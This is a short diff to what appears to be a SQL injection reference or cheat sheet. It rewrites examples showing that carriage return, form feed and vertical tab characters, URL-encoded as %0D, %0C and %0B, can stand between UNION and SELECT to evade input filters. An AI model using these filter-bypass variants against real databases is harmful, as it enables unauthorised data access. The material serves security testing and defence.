@@ -114,11 +114,14 @@ SELECT id FROM users UNION  SELECT 999
 SELECT id FROM users UNION
 SELECT 999
 
--- Carriage return between UNION and SELECT
-SELECT id FROM users UNIONSELECT 999
+-- Carriage return (%0D) between UNION and SELECT
+SELECT id FROM users UNION%0DSELECT 999
 
--- Form feed and vertical tab work too
-SELECT id FROM users UNIONSELECT 999
+-- Form feed (%0C) between UNION and SELECT
+SELECT id FROM users UNION%0CSELECT 999
+
+-- Vertical tab (%0B) also works
+SELECT id FROM users UNION%0BSELECT 999
 ```
 
 #### Characters Allowed After AND/OR
